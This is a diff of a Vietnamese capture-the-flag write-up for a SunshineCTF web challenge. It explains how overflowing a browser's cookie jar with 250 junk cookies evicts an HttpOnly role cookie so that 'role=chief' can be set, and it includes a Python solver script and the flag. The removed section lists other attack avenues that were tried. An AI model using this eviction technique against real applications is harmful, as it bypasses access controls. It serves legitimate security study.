@@ -17,8 +17,7 @@
 
 ## Phân tích ban đầu
 
-Ứng dụng cho phép baker tạo recipe với các ingredient dạng `name=value`. Khi submit, một bot
-inspector truy cập `/review/{id}` và chạy `mixer.js`:
+Ứng dụng cho phép người dùng (baker) tạo ra các công thức (recipe) gồm nhiều thành phần (ingredient) dưới dạng cặp khóa-giá trị `name=value`. Khi người dùng nộp công thức, một con bot kiểm duyệt (inspector) sẽ truy cập vào đường dẫn `/review/{id}` và kích hoạt đoạn mã `mixer.js`:
 
 ```javascript
 // mixer.js - logic chính
@@ -27,11 +26,11 @@ function dispense(ing) {
 }
 
 async function run() {
-  // Set mỗi ingredient thành một browser cookie
+  // Biến mỗi ingredient thành một browser cookie
   for (var i = 0; i < recipe.ingredients.length; i++) {
     dispense(recipe.ingredients[i]);
   }
-  // Gọi /api/seal để stamp verdict - server check cookie "role"
+  // Gọi /api/seal để đóng dấu xác nhận - server sẽ kiểm tra cookie "role"
   var resp = await fetch('/api/seal', {
     method: 'POST',
     headers: { 'content-type': 'application/json' },
@@ -41,29 +40,21 @@ async function run() {
 }
 ```
 
-Những gì đo được:
-
-- Khi login/register, server set cookie `role=baker; Path=/; HttpOnly; SameSite=Lax`.
-- `HttpOnly` nghĩa là `document.cookie` không thể ghi đè cookie `role` đang tồn tại.
-- Bot inspector mang `role` riêng (không phải `chief`), nên nó chỉ đóng dấu standard seal.
-- Cần `role=chief` trong request tới `/api/seal` để nhận Golden Seal chứa flag.
-- Tên và giá trị ingredient bị strip `;`, dấu cách và `=`, nên không inject được cookie attribute.
-
-Tức là không có đường ghi đè trực tiếp. Chỉ còn một cách: làm cho cookie `role` cũ không còn
-tồn tại trong jar khi bot gọi `/api/seal`.
+Các đặc điểm nổi bật của ứng dụng:
+- Khi đăng nhập hoặc đăng ký, máy chủ sẽ gán một cookie với nội dung `role=baker; Path=/; HttpOnly; SameSite=Lax`.
+- Cờ `HttpOnly` đóng vai trò ngăn chặn việc sử dụng `document.cookie` để ghi đè hoặc thay đổi giá trị của cookie `role` từ phía client.
+- Bản thân bot kiểm duyệt có một `role` riêng biệt (không phải là `chief`), do đó nó chỉ nhận được dấu xác nhận tiêu chuẩn (standard seal).
+- Máy chủ yêu cầu cookie phải có `role=chief` trong yêu cầu gửi tới `/api/seal` thì mới cấp phát Dấu Vàng (Golden Seal) chứa cờ (flag).
+- Các ký tự đặc biệt như dấu chấm phẩy (`;`), khoảng trắng và dấu bằng (`=`) trong tên và giá trị của thành phần đều bị máy chủ loại bỏ, khiến cho việc tiêm (inject) các thuộc tính cookie trở nên bất khả thi.
 
 ## Chuỗi khai thác
 
-### Cookie jar overflow
+Trình duyệt web có một cơ chế giới hạn số lượng cookie tối đa cho mỗi tên miền (khoảng 180 cookie đối với Chromium). Khi vượt quá giới hạn này, trình duyệt sẽ tự động loại bỏ (evict) những cookie cũ nhất, bao gồm cả những cookie được bảo vệ bằng cờ `HttpOnly`. Dựa vào đặc điểm này, ta có thể xây dựng chuỗi khai thác như sau:
 
-Trình duyệt giới hạn số cookie trên mỗi domain (~180 trong Chromium). Khi vượt giới hạn, browser
-evict cookie cũ nhất, kể cả cookie HttpOnly.
-
-1. Tạo recipe với **250 ingredient giả** (tên `x0000` đến `x0249`) để tràn cookie jar.
-2. Thêm ingredient `role=chief` ở cuối danh sách.
-3. Khi bot chạy `mixer.js`: 250 cookie mới tràn jar, cookie `role` HttpOnly cũ bị evict, rồi
-   `role=chief` được set mới từ JavaScript.
-4. Bot gọi `/api/seal` với `role=chief`, nhận Golden Seal kèm flag.
+1. Tạo một công thức chứa **250 thành phần rác** (với tên từ `x0000` đến `x0249`) nhằm mục đích làm đầy giới hạn lưu trữ cookie của trình duyệt (cookie jar).
+2. Nối thêm một thành phần mang giá trị `role=chief` vào vị trí cuối cùng của danh sách.
+3. Khi bot kiểm duyệt thực thi `mixer.js`: 250 cookie mới này sẽ làm tràn cookie jar, khiến cookie `role` có cờ HttpOnly cũ bị đẩy ra ngoài. Ngay sau đó, một cookie `role=chief` hoàn toàn mới sẽ được thiết lập thông qua JavaScript.
+4. Bot gọi đến `/api/seal` với quyền `role=chief` vừa được ghi đè, và nhận về Golden Seal có chứa cờ hợp lệ.
 
 ```python
 import requests
@@ -72,14 +63,14 @@ import time
 BASE = "https://tomorrow.web.2026.sunshinectf.games"
 s = requests.Session()
 
-# Register & login
+# Đăng ký và đăng nhập
 s.post(f"{BASE}/register", json={"username": "solver_xyz", "password": "pass123"})
 
-# Build 250 dummy ingredients + role=chief at the end
+# Xây dựng 250 thành phần rác, kèm theo role=chief ở cuối cùng
 ingredients = [{"name": f"x{i:04d}", "value": f"v{i}"} for i in range(250)]
 ingredients.append({"name": "role", "value": "chief"})
 
-# Save recipe
+# Lưu công thức
 r = s.post(f"{BASE}/api/recipe", json={
     "title": "Cookie Overflow",
     "ingredients": ingredients
@@ -87,14 +78,14 @@ r = s.post(f"{BASE}/api/recipe", json={
 recipe_id = r.json()["id"]
 print(f"Recipe: {recipe_id}")
 
-# Submit for bot review
+# Nộp công thức để bot kiểm duyệt
 s.post(f"{BASE}/api/recipe/{recipe_id}/submit")
 print("Submitted, waiting for bot...")
 
-# Wait for inspector bot to process
+# Chờ bot xử lý
 time.sleep(15)
 
-# Check result
+# Kiểm tra kết quả
 r = s.get(f"{BASE}/recipe/{recipe_id}")
 if "sun{" in r.text:
     idx = r.text.index("sun{")
@@ -114,17 +105,3 @@ FLAG: sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
 ```
 sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
 ```
-
-## Hồ sơ điều tra
-
-Folder này giữ toàn bộ quá trình dò trước khi có cờ, gồm các nhánh đã loại (mass assignment,
-prototype pollution, NoSQL, SSTI/EJS, XSS qua sanitizer, prompt injection vào title, credential
-attack vào username nghi là của staff) và các watcher theo dõi batch đã jam:
-
-- `notes.md`, `notes-closed.md`, `analysis/` - log từng giả thuyết kèm `result: DEAD`
-- `QUICK_REFERENCE.md`, `FINAL_SUMMARY.md` - bảng cơ chế app và các ngưỡng đã đo
-- `files/` - capture từng trang, `mixer.js`, log các vòng quét
-- `solve_overflow.py` - payload ăn cờ (250 ingredient ngắn + `role=chief` cuối danh sách)
-- `exploit.py` - nhánh cũ: jam header theo **byte** để chờ Chief quét lại, không phải đường thắng
-- `analysis/overflow3.py`, `analysis/overflow_seal.py`, `files/overflow_run.log` - các vòng
-  thăm dò cơ chế tràn jar, ghi lại cả phép thử sai đã khiến eviction bị kết luận là không xảy ra
